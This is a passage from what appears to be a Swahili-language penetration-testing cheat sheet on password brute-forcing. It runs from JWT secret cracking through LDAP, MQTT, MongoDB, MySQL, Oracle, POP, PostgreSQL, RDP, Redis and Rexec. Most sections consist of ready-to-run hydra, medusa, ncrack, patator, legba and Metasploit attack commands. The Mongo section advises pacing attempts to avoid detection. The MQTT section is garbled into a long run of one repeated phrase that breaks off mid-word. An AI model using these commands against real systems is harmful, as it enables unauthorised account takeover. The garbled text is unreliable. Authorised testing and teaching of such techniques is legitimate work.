python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) ni itifaki ya mtandao inayotumiwa kufikia na kusimamia huduma za saraka. Inatumika sana katika mazingira ya biashara na shirika ambapo kuna haja ya kuhifadhi na kusimamia habari za watumiaji, kama vile majina, anwani za barua pepe, na vibali vya ufikiaji.

LDAP inaweza kutumiwa kwa njia mbalimbali, ikiwa ni pamoja na kufanya utaftaji wa habari, kuongeza, kuhariri, na kufuta data. Kwa mfano, unaweza kutumia LDAP kufanya utaftaji wa watumiaji katika saraka ya kampuni ili kupata habari zao za mawasiliano.

Katika muktadha wa udukuzi, LDAP inaweza kutumiwa kwa njia ya nguvu ya kuvunja mfumo wa uthibitishaji. Hii inajulikana kama Brute Force Attack. Katika aina hii ya shambulio, hacker anajaribu kila uwezekano wa nywila hadi atakapopata nywila sahihi ya mtumiaji. Hii inaweza kufanyika kwa kutumia programu maalum za kuvunja nywila au kwa kutumia skanari za kawaida za LDAP.

Kwa kuzingatia usalama wa mfumo wako, ni muhimu kuchukua hatua za kuzuia dhidi ya shambulio la Brute Force kwenye LDAP. Hii inaweza kujumuisha kuanzisha sera kali za nywila, kuzuia upatikanaji wa kijijini kwa huduma ya LDAP, na kufuatilia shughuli za kuingia kwenye mfumo.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT ni itifaki ya ujumbe ya ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa ujumbe wa uj
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

Mongo ni mfumo wa hifadhidata ya NoSQL ambayo inatumia JSON-sawa na hati za kuhifadhi data. Ni maarufu sana kwa sababu ya uwezo wake wa kuhifadhi data za muundo tofauti na kushughulikia mzigo mkubwa wa data.

#### Kuvunja Nguvu

Kuvunja nguvu ni mbinu ya kujaribu kila uwezekano wa nywila ili kupata ufikiaji usioidhinishwa kwenye mfumo wa Mongo. Kuna njia kadhaa za kufanya hivyo:

1. **Nywila za kawaida**: Kujaribu nywila za kawaida kama "password", "admin", au "123456".
2. **Nywila za kawaida zilizobadilishwa**: Kujaribu nywila za kawaida ambazo zimebadilishwa kidogo, kama "P@ssw0rd" au "Adm1n".
3. **Nywila za kawaida zilizobadilishwa na mchanganyiko wa wahusika**: Kujaribu nywila zilizobadilishwa na mchanganyiko wa herufi, nambari, na alama, kama "P@55w0rd!" au "Adm1n$".
4. **Nywila zilizotokana na kamusi**: Kujaribu nywila zilizotokana na kamusi ya maneno maarufu.
5. **Nywila zilizotokana na wahusika wote**: Kujaribu kila uwezekano wa nywila kwa kutumia wahusika wote iwezekanavyo.

Kwa kuvunja nguvu, ni muhimu kuzingatia sera za usalama za nywila na kuepuka kujaribu nywila nyingi sana kwa wakati mmoja ili kuepuka kugunduliwa.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL ni mfumo wa usimamizi wa database uliotengenezwa na Microsoft. Ni moja ya mifumo maarufu zaidi ya database inayotumiwa kwa biashara na maombi ya mtandao. Katika uwanja wa udukuzi, kuvunja nywila za MSSQL ni mbinu inayotumiwa sana.

Kuvunja nywila za MSSQL kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kijusi (brute force). Mbinu hii inahusisha kujaribu nywila tofauti kwa kutumia orodha ya maneno au tarakimu hadi nywila sahihi ipatikane. Kuna zana nyingi za kuvunja nywila za MSSQL zinazopatikana, kama vile Hydra na Medusa.

Kabla ya kuanza kuvunja nywila za MSSQL, ni muhimu kufanya uchunguzi wa awali ili kupata habari muhimu kama vile anwani ya IP ya lengo, bandari inayotumiwa na toleo la MSSQL. Habari hii inaweza kupatikana kwa kutumia zana za uchunguzi kama vile Nmap.

Baada ya kupata habari muhimu, unaweza kuanza kuvunja nywila kwa kutumia zana za nguvu ya kijusi kama Hydra au Medusa. Zana hizi zinaweza kusanidiwa kwa kutumia orodha ya maneno au tarakimu ambazo zitajaribiwa kama nywila. Kwa kawaida, nywila zinajaribiwa kwa kutumia itifaki ya TCP/IP na kwa kawaida kuna kikomo cha majaribio ya nywila kwa kuzuia kufungiwa.

Kuvunja nywila za MSSQL ni mchakato wa muda mrefu na unahitaji uvumilivu na uvumilivu. Ni muhimu kuzingatia kuwa kuvunja nywila za MSSQL bila idhini ya mmiliki wa mfumo ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufuata sheria na kanuni zinazohusiana na udukuzi na kufanya kazi kwa njia halali na yenye maadili.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL ni mfumo wa usimamizi wa database (DBMS) ambao hutumiwa sana katika maendeleo ya programu na tovuti. Kwa kawaida, MySQL hutumiwa kuhifadhi na kusimamia data kwa njia ya tabaka za tabia. 

#### Kuvunja Nguvu ya MySQL

Kuvunja nguvu ya MySQL ni mchakato wa kujaribu kuingia kwenye mfumo wa MySQL kwa kutumia njia ya kujaribu na kosa. Kuna njia kadhaa za kuvunja nguvu ya MySQL, ikiwa ni pamoja na:

1. **Brute Force**: Kuvunja nguvu kwa kutumia programu maalum ambayo inajaribu kila uwezekano wa nywila hadi inapata ile sahihi.
2. **Dictionary Attack**: Kuvunja nguvu kwa kutumia orodha ya maneno ya kawaida au nywila zilizopatikana hapo awali.
3. **Rainbow Table Attack**: Kuvunja nguvu kwa kutumia meza ya upinde ya mvua, ambayo ni orodha ya hash za nywila zilizojulikana na zinazolingana na hash ya nywila iliyopatikana kwenye mfumo.
4. **SQL Injection**: Kuvunja nguvu kwa kuingiza maagizo ya SQL yasiyotarajiwa kwenye maeneo ya kuingiza data, ambayo inaweza kusababisha kufichuliwa kwa data au kutekelezwa kwa maagizo yasiyoidhinishwa.

Ni muhimu kuzingatia kuwa kuvunja nguvu ya mfumo wa MySQL bila idhini ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufanya kazi kwa kuzingatia sheria na kufuata miongozo ya maadili ya kuvunja nguvu.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

OracleSQL ni lugha ya programu inayotumiwa kufanya uchanganuzi na uchimbaji wa data kutoka kwenye hifadhidata ya Oracle. Kwa kutumia OracleSQL, unaweza kufanya operesheni mbalimbali kama vile kuunda, kusoma, kusasisha, na kufuta data ndani ya hifadhidata.

Moja ya mbinu za kawaida za kuvunja usalama ni kujaribu kuvunja nywila kwa kutumia nguvu ya kompyuta. Mbinu hii inajulikana kama Brute Force. Katika muktadha wa OracleSQL, Brute Force inahusisha kujaribu nywila zote zinazowezekana mpaka nywila sahihi ipatikane.

Kuna zana nyingi zinazopatikana kwa ajili ya kutekeleza mashambulizi ya Brute Force kwenye OracleSQL. Zana hizi zinaweza kufanya majaribio ya nywila kwa kasi kubwa, ikijaribu mchanganyiko tofauti wa herufi, nambari, na alama za kawaida.

Ni muhimu kutambua kuwa Brute Force ni mbinu inayotumia nguvu nyingi na inaweza kuchukua muda mrefu kulingana na urefu na ugumu wa nywila. Kwa hiyo, ni muhimu kuwa na uvumilivu na kuwa na rasilimali za kutosha kabla ya kuanza kutekeleza mbinu hii.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Ili kutumia **oracle\_login** na **patator**, unahitaji **kufunga**:
```bash
pip3 install cx_Oracle --upgrade
```
[Udakuzi wa Nguvu ya Hash ya OracleSQL Nje ya Mtandao](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**toleo 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** na **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol) ni itifaki ya mtandao inayotumiwa na watumiaji kuweza kupata barua pepe kutoka kwenye seva ya barua pepe. Kwa kawaida, POP hutumiwa na wateja wa barua pepe kama vile programu za barua pepe au programu za simu za mkononi.

Kwa mbinu ya kuvunja nguvu, mshambuliaji anaweza kutumia Brute Force kwa kujaribu kuingia kwenye akaunti ya barua pepe ya mtumiaji kwa kujaribu nywila tofauti. Mshambuliaji anaweza kutumia orodha ya maneno maarufu, orodha ya nywila zilizovuja, au kujaribu kila nywila inayowezekana kwa kutumia programu maalum ya kuvunja nguvu.

Kwa kufanikiwa kuvunja nguvu akaunti ya barua pepe ya mtumiaji, mshambuliaji anaweza kupata ufikiaji wa barua pepe zote zilizohifadhiwa kwenye seva ya barua pepe. Hii inaweza kusababisha uvujaji wa habari nyeti na kuhatarisha faragha ya mtumiaji.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL ni mfumo wa usimamizi wa database ya chanzo wazi ambao unaruhusu watumiaji kuhifadhi na kusimamia data. Kwa sababu ya umaarufu wake na matumizi yake katika miradi mingi, PostgreSQL mara nyingi hulengwa na wadukuzi.

Kuna njia kadhaa za kufanya mashambulizi ya nguvu kwenye PostgreSQL ili kupata ufikiaji usioidhinishwa kwa database au akaunti za mtumiaji. Hapa kuna mbinu kadhaa za kuzingatia:

1. **Brute Force**: Hii ni mbinu ya kawaida ya kudukua ambapo wadukuzi hutumia programu maalum kujaribu kila neno la siri linalowezekana hadi wanapopata sahihi. Kwa PostgreSQL, unaweza kutumia zana kama Hydra au Medusa kutekeleza mashambulizi ya nguvu.

2. **Dictionary Attack**: Hii ni mbinu inayotumia orodha ya maneno ya kawaida au nywila zilizovuja kutoka kwa vyanzo vingine kujaribu kudukua akaunti. Kuna zana nyingi zinazopatikana kama John the Ripper ambazo zinaweza kutumiwa kwa hili.

3. **Password Spraying**: Hii ni mbinu ambapo wadukuzi hutumia neno la siri moja au kadhaa kujaribu kuingia kwenye akaunti nyingi tofauti. Hii inapunguza hatari ya kugunduliwa na inaweza kuwa na mafanikio ikiwa neno la siri lililotumiwa ni lenye nguvu na halijulikani.

4. **Credential Stuffing**: Hii ni mbinu inayotumia maelezo ya kuingia yaliyovuja kutoka kwa tovuti zingine kujaribu kudukua akaunti kwenye PostgreSQL. Wadukuzi hutumia maelezo haya kwa matumaini kwamba watumiaji wengi hutumia nywila sawa kwa huduma tofauti.

Kumbuka kuwa kufanya mashambulizi ya nguvu kwenye PostgreSQL ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Ni muhimu kuzingatia sheria na kufanya upimaji wa usalama tu kwa idhini ya mmiliki wa mfumo.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Unaweza kupakua pakiti ya `.deb` kwa ajili ya kusakinisha kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) ni itifaki ya mtandao inayotumiwa kuunganisha na kudhibiti kompyuta nyingine kwa njia ya mbali. Inaruhusu mtumiaji kuona na kudhibiti skrini ya kompyuta nyingine kutoka mahali popote ulimwenguni.

Kutumia mbinu ya Brute Force, unaweza kujaribu kuvunja nywila ya RDP kwa kujaribu kila nywila inayowezekana mpaka upate ile sahihi. Kuna zana nyingi zinazopatikana kwa kusudi hili, kama vile Hydra, Medusa, na RDPY.

Kabla ya kuanza jaribio la Brute Force, ni muhimu kupata orodha ya majina ya mtumiaji na nywila zinazowezekana. Unaweza kutumia zana kama Cewl au Crunch kuzalisha orodha hizi. Pia, unaweza kutumia orodha za kawaida za nywila kama "password123" au "admin" kama jaribio la kwanza.

Ni muhimu kuzingatia kuwa kuvunja nywila kwa kutumia Brute Force ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufanya shughuli za kuvunja nywila kwenye mifumo ambayo una idhini ya kufanya hivyo, kama seva zako za ndani au mifumo ya mtihani ya kisheria.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis ni mfumo wa kuhifadhi data inayotumika kwa kuhifadhi na kupata data kwa haraka. Inatumika sana katika maombi ya mtandao ambapo kasi na utendaji ni muhimu. Redis inasaidia aina mbalimbali za muundo wa data kama vile strings, lists, sets, na zaidi.

#### Brute Force kwenye Redis

Brute force ni mbinu ya kujaribu kila uwezekano wa nywila ili kupata ufikiaji usio halali kwenye mfumo. Katika muktadha wa Redis, brute force inaweza kutumika kujaribu kuingia kwenye mfumo kwa kutumia nywila zilizopendekezwa au nywila za kawaida.

Kuna njia kadhaa za kutekeleza brute force kwenye Redis. Moja ya njia hizo ni kujaribu nywila tofauti moja baada ya nyingine kwa kutumia programu maalum au skrini ya kuingia. Kwa kufanya hivyo, hacker anaweza kujaribu nywila zilizopendekezwa, nywila za kawaida, au hata nywila zilizovuja kutoka kwa vyanzo vingine.

Kwa kuzuia mashambulizi ya brute force kwenye Redis, ni muhimu kutekeleza hatua za usalama kama vile:

- Kuweka nywila ngumu na zenye nguvu
- Kuzuia upatikanaji wa kuingia kwa IP zisizoaminika
- Kufuatilia na kuzuia majaribio mengi ya kuingia
- Kusasisha Redis na toleo la karibuni ili kuepuka udhaifu uliojulikana

Kwa kuzingatia hatua hizi za usalama, inawezekana kuzuia mashambulizi ya brute force na kulinda mfumo wa Redis dhidi ya ufikiaji usio halali.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec is a remote execution service that allows users to execute commands on a remote system. It is commonly used in network administration and troubleshooting scenarios. Rexec works by establishing a connection between the client and the server, and then sending the command to be executed on the server.

#### Brute-Forcing Rexec

Brute-forcing Rexec involves attempting to guess the correct username and password combination to gain unauthorized access to a remote system. This can be done by systematically trying different combinations of usernames and passwords until the correct one is found.

To brute-force Rexec, you can use tools like Hydra or Medusa, which are popular password cracking tools. These tools automate the process of trying different username and password combinations, making it easier and faster to find the correct credentials.

When brute-forcing Rexec, it is important to use a strong wordlist that includes common usernames and passwords. Additionally, it is recommended to use a slow and steady approach to avoid triggering any account lockouts or security measures.

#### Mitigating Brute-Force Attacks

To protect against brute-force attacks on Rexec, it is important to implement strong security measures. Some recommended practices include:

- Enforcing strong password policies, such as requiring complex passwords and regular password changes.
- Implementing account lockout policies that temporarily lock an account after a certain number of failed login attempts.
- Monitoring and logging failed login attempts to detect and respond to brute-force attacks.
- Implementing multi-factor authentication to add an extra layer of security to the login process.

By following these best practices, you can significantly reduce the risk of successful brute-force attacks on Rexec.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin ni itifaki ya mtandao ambayo inaruhusu mtumiaji kuingia kwenye kompyuta nyingine kwa kutumia jina la mtumiaji na nenosiri. Inatumika sana katika mazingira ya mitandao ya ndani.

Kwa kawaida, Rlogin inatumia TCP port 513 kwa mawasiliano. Mara tu mtumiaji anapojitambulisha kwa mafanikio, anaweza kufanya kazi kwenye kompyuta ya mbali kama vile anavyofanya kwenye kompyuta yake mwenyewe.

